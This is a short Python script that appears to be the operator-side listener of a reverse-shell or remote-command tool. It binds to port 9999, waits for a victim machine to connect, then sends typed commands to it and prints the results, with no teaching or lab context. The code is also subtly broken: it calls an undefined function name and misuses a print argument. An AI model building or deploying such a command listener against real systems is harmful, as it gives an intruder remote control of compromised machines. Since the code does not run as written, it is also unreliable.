import os
import sys
import subprocess
import socket


def create_socket():
    try:
        global host
        global a
        global port
        host = ''
        port = 9999

        a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as txt:
        print("Error creating socket:" + str(txt))


def socket_bind():
    try:
        global host
        global port
        global a

        print("binding socket to port:" + str(port))
        a.bind((host, port))
        a.listen(10)

    except socket.error as txt:
        print("Error connecting to the port:" + str(txt))
        socket_bind()

def socket_verify():
    global host
    global port
    global a

    conn, address = a.accept()
    print("Connection established with port = " + "Port " + str(address[1]))
    send_commands(conn)
    conn.close()


def send_command(conn):

    while True:
        command = input()

        if command == "quit":
            conn.close()
            a.close()
            sys.exit()

        if len(str(command)) > 0:
            conn.send(str.encode(command))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, "end=")


def main():
    create_socket()
    socket_bind()
    socket_verify()

main()









